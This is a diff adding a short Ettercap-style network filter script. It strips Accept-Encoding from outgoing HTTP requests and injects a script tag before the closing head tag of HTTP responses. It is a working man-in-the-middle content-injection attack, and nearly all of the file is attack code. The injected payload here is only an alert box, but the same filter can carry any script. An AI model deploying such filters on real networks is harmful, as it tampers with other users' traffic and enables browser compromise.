@@ -1,0 +1,13 @@
+if (ip.proto == TCP && tcp.dst == 80) {
+if (search(DATA.data, "Accept-Encoding")) {
+	pcre_regex(DATA.data, "(Accept-Encoding:).*([\r\n])", "$1 identity$2");
+	msg("=");
+}
+}
+if (ip.proto == TCP && tcp.src == 80) {
+if (pcre_regex(DATA.data, "<\/head>")){
+pcre_regex(DATA.data, "(<\/head>)","<script>alert('Injected')</
+script>$1");
+msg("+");
+}
+}
